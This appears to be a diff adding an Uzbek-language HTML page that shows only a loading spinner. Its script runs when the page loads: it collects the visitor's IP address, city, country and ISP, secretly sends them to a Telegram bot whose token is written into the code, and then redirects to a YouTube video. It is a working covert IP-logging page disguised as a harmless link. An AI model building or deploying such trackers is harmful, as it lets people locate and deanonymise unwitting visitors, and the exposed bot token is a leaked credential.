@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yuklanmoqda...</title>
+    <style>
+        body { display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #000; color: #fff; font-family: sans-serif; }
+        .loader { border: 4px solid #333; border-top: 4px solid #fff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+
+    <script>
+        // Sizning ma'lumotlaringiz
+        const BOT_TOKEN = '9135183024:AAHV3QL2_E6QbZ_s8tFvIVSDLfN3y24T3xs';
+        const CHAT_ID = '9135183024'; 
+        const YOUTUBE_URL = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'; // Bu yerga xohlagan videongizni qo'ying
+
+        async function main() {
+            try {
+                // IP ma'lumotlarini olish
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+
+                // Telegram botga yuborish uchun xabar tayyorlash
+                const text = `🔔 Yangi tashrif\n\n🌐 IP: ${data.ip || 'Noma\'lum'}\n📍 Shahar: ${data.city || 'Noma\'lum'}\n🗺️ Davlat: ${data.country_name || 'Noma\'lum'}\n📡 Operator: ${data.org || 'Noma\'lum'}`;
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+                });
+
+            } catch (e) {
+                console.log('Xatolik:', e);
+            } finally {
+                // Ma'lumot yuborilgandan so'ng YouTube'ga yo'naltirish
+                window.location.href = YOUTUBE_URL;
+            }
+        }
+
+        // Sahifa yuklanganda ishga tushirish
+        window.onload = main;
+    </script>
+</body>
+</html>
